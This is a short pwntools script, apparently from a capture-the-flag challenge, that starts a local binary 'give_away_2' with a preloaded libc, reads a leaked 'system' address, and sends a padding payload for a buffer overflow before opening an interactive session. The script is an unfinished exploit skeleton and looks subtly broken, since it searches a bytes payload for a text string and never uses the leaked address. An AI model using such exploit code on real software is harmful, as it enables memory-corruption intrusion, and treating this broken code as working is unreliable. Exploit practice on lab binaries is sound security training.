from pwn import *
import string

s = string.printable


p = process('./give_away_2', env={'LD_PRELOAD': 'libc-2.27.so'})

input("attach")

system = p.recvline().split()[-1]

payload = b"".join([bytes(i*4, 'utf-8') for i in s])

payload = payload[:payload.index('aaaa')]

p.sendline(payload)


p.interactive()

